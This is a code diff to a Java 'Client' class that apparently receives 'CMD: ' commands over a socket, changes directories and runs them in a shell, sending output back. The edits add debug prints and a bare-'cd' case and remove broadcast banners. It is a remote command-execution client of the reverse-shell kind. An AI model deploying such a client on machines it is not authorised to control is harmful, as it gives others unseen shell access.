@@ -35,12 +35,26 @@ public class Client {
                     if(!cmd.startsWith("CMD: ")) {
                         continue;
                     }
-                    writer.println("\u001B[33m" + "Start of broadcast @ port " + socket.getLocalPort() + "\u001B[0m" + "\n");
                     cmd = cmd.substring(4).trim();
 
                     if(cmd.toLowerCase().startsWith("cd")) {
-                        String newPath = cmd.substring(3).trim();
-                        File newDir = new File(workingDir, newPath);
+                        String newPath;
+                        if(!cmd.equals("cd")) {
+                            System.out.println("HERE");
+                            newPath = cmd.substring(3).trim();
+                        } else {
+                            newPath = cmd;
+                        }
+                        File newDir;
+                        if(cmd.equals("cd")) {
+                            newDir = new File("C:\\", "");
+                        } else {
+                            newDir = new File(workingDir, newPath);
+                        }
+                        
+                        System.out.println(newDir.toString());
+                        System.out.println(newDir.exists());
+                        System.out.println(newDir.isDirectory());
                         if(newDir.exists() && newDir.isDirectory()) {
                             workingDir = newDir.getCanonicalFile();
                             writer.println("Directory changed to: " + workingDir.getAbsolutePath());
@@ -48,7 +62,6 @@ public class Client {
                             writer.println("cannot find path.");
                         }
                         writer.flush();
-                        writer.println("\n" + "\u001B[33m" + "Broadcast completed @ Port " + socket.getLocalPort() + "." + "\u001B[0m");
                         continue;
                     }
 
@@ -69,7 +82,6 @@ public class Client {
                     } catch(IOException ignored) {}
                 
                 shell.waitFor();
-                writer.println("\n" + "\u001B[33m" + "Broadcast completed @ Port " + socket.getLocalPort() + "." + "\u001B[0m");
                 writer.flush();
                 }
                     
